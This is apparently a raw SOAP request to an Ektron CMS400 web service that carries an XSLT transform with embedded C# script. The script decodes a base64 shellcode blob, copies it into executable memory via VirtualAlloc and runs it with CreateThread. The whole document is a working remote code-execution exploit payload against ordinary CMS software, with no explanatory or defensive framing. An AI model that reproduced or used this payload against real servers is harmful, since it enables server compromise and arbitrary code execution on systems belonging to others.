<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ContentBlockEx xmlns="http://www.ektron.com/CMS400/Webservice">
      
      <Xslt>
        <![CDATA[
        <xsl:transform version="2.0"
          xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
          xmlns:msxsl="urn:schemas-microsoft-com:xslt"
          xmlns:user="http://mycompany.com/mynamespace">
          <msxsl:script language="C#" implements-prefix="user">

            private static UInt32 MEM_COMMIT = 0x1000;
            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]
            private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

            public string xml()
            {
              string shellcode64 = @&quot;kUOTSZk/kUZHly9IkUCSP09KRz9KmzfWP9YnmJf8SE/WmEqQk5BIQECTkZAnQPiXLzcvQpP5+EabkvVClpKfkUGbN59KmP39P0dCm0ZG1kEnQflOSCeb1if9+C/4S5FHSZiWQUObSpuSSjcv+S9I+PWXm0dPk0D1SfiQ/EJHL0eQl5D5S0qX9ZBGR58vQZBC1pf5/UCW1pD1R59OP0Y/lphBkJeR/U+SmNYn/fmXS0dBTpeYQUDWSvX8N5tCTz9GJ0M/N5tGkJiZ+JGZSkP8kEv4SUqXN0dHSJObmdb4J/xGPz+YP/VJSj9PQJJO+JtC/S/5l/2bljdKTkL4+Us3QZE/1k9Gn/mZkE6fQkBCP0qY+JFIm0dLmC8/lv1GR5BGkpb8P0iZSkD8n0iXm0NKT5gnm5+RmZL5/P1L9daXm5tATpkvQkEvk0abQpZKSpH5kkg3Tz9PmE/1kk+RnzdDQEn9SDf1+E5JmDf8L/xIJz8/1j8/m5A/Rkr5P5FASvVKJ5CYQEL5QpuY1kc3n5P5SUNL9ZdBS5ubQpeZkfVH/EI3JzeTlkufS5JPQEFBkk4nn5CQkZP9P5uX9Z9ISfiR+PxCSfknL5aXmSdL9fWW/UhJQkn9mZH5/JublkY/9UAvP0lPmPn9/fj9RklBSpv4T/03QECSSC/81pBCQS/8P5I/J5NKkj9D1vzWmJf5L5L1+PiQRklLlkP8kz9CTpKTmED5QUbWkPWRmPX8mTdAkieRS0dHQZtDk5YnJ/1AlkmZkJb8ltbWT/U/m9ZCT/X8mJGY1j83Q0I//EGZN0j4+JGQl5ZG1kv9/S+bJ0lKRphOm5tPkpGQk/if/fWZmEMnn5b5TycnRjdCmJtOm0eZl5vW1psnQk/5S9ZIQJnWL0OSJ5JKL/1An5eZT5NC+U6XT0g3R/VGkP1AQ9ZDmC/WQy9AlviZQplIL5ZDkpD8kjeZSZORN0KTS5BBQ/xKSZn8T5Y/R9aTRvmWJ0CZmD+Wkpv4lzdDL0mZmfyWl5BCl0BBlvhGSS+YkkFGT/34QkY3+U43l0OY9UefmTdKQy+TmCeSSUL41pH5QktBL0JCm/w3P0ZJJ0r8TkA/TkNG+D9KSPk3l5MvQptCTvnWkkD9T0g3n0dBkpJCS9abL5FA/ZuZN5P41tZKSkpCmJj1SSdJS043L0GWL0BDR0FL+JhKS5c3QDdHJ0L5P5mQkECZ+EGbS9ZHkU6ZQ0/8QUafkEuYSZaTmJtDT0NGm5E/lkZGNy+XSEiZ/EkvmfVIQ5iRSJb1T0aRRp/4/C+RkktL+PlGSkhHn/1L+Jb9kT+bmZb8L0MnL5EvkUmY+f2ZP0iT/fVA/fiS/C/W9UCbTkb8mZA3/C/9P5hIlpdJP59IN/yT+Z+fQy8/SEn9S5FJS5D4SEBA1pP8JzdOkZgnm/xIR5P8J/k3+NZI9fxBQ0Y/kZmYRkD8/JDW/UY3RvXWlvz4+Er9S/lJmE6RRj+bkviT/J9Hl5tGJ0eT+U5GSvifmUb8S05BRkiRmUCWQ0qWSZ+WN0pDSC/WTz+Tly+Sn0mRJ5ZLQPz1kED8P5aYJ0v5kkYn1klK1i8vQZBPL0JHlkdOJ5CZlkeSQD8/k5iZl5aQlkBOSJH1m0tISEj5QfX8S5NOS/lOSZmX+JeXlz9A9ZAvmUP5lvxD9S+bSCeTQ/1HJ/nWTvz5TpE3SC+Y1ptImD+X+ZZCkfiRS5tIP0JLQ5ObTvVAkyebn0eXkZObk09JSvlBRy9DL9afQU+Xl0+R/JJK1keb/JKRN/2S9ZeWQ/w/QE79k/n8Qif9TyfWmZtCRz9KkCdGQEuZQpD4l/w/9ZFKQjfWQZdPJ/mYRpP4l5FCk5JHSkqbQp9J+JMv/T+Y1kOb/ZdOS5NISvlOkEInQj/W/UhJQvmb1phPSZmZkk43QPn5mfyWSkg3+ZH1kJL49UZP1p8n+Cc/mPw/n0tAl5CTlvj9+Jb5QZhOTkc3+UabR0I/lpeXmUdPQPVPSj/8SkqfRpIvRphP9UuRTktLR0o3NyeYRidI9ZCbQpmRRpj5mJZCkyeQPy9HQpFPSJBPl0M3Nz83Rjf8+JuSm0g/+EL4Q5uR/ZFLkPhKStZGR/1HTydOn5CS1vX81kAv1pZJlvxKT06Xlp/5L/2S/dY3SUY/R5NPlkL59UKZki/8T/wn1pGY9UCTk5j9/JJJmS8//JAvS0lPP5FBlkKTn5bWQEI3mJuSl0HWP0Ob+U9LQUA3SZObm0hJN/39SUj5Rps//UCYTkdDkpb4+Z+Q1kNJ/fiZS/X1+Sf59U9ASflJm583R9aQ1pP9Q0lJR0JBm5Yvm0Cfn0k3Qp8/QUI3lvmZkDeb+UmT+JZBQEFI+UH8mE/4mENI+JuXSJf5Rj+RS5BOm0r4QpEv/PxDkfySSZlDQvxB+C/5mEafTvWZT0cv1kM3Rif5N5tKn5cnQUdKkJlCTj+Q/CfWm9ZI1khImJL4/D/8T/1G/ZdPmdb1TkqbQ5/81vVCTkL5+fWbN043SZhPmZaY9T9LlkInTpKfTj/9N05Gm5D4R0A39UmWkJiSSJGbQEY//Jv5Tk9HQEj8+Uv5l5L8N59O/U8v/ENPQpFH+Esnm5OXk0P51vWY/dZOQPVD/Cf5/PxOJ5KQkS9OL59O1kOYP5v5L0P4mz/Wn5BPmUlBTkKfkpmTk0abkvmWky8vkZJKn0iZQpOTRpmbmdaYN/iXgcRU8v//X19QQVlMT0FEX18=&quot;;
              byte[] shellcode = System.Convert.FromBase64String(shellcode64);
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
              IntPtr hThread = IntPtr.Zero;
              IntPtr pinfo = IntPtr.Zero;
              UInt32 threadId = 0;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              return &quot;WjgxDOk&quot;;
            }
          </msxsl:script>
          <xsl:template match="/">
            <xsl:value-of select="user:xml()"/>
          </xsl:template>
        </xsl:transform>
        ]]>
      </Xslt>
    </ContentBlockEx>
  </soap:Body>
</soap:Envelope>

